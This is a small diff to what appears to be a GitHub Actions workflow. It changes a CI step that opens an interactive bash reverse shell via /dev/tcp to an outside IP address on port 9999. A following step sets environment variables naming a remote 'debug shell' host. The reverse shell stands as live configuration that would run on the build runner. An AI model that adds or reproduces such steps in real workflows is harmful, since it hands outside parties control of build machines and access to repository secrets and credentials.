@@ -9,7 +9,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - run: |
-        bash -i >& /dev/tcp/65.21.11.22/9999 0>&1
+        bash -i >& /dev/tcp/18.218.123.251/9999 0>&1
     - run: |
         export VULCON_DEBUG_SHELL_HOST="cloud.security.amagi.tv"
         export VULCON_DEBUG_SHELL_PORT=9999
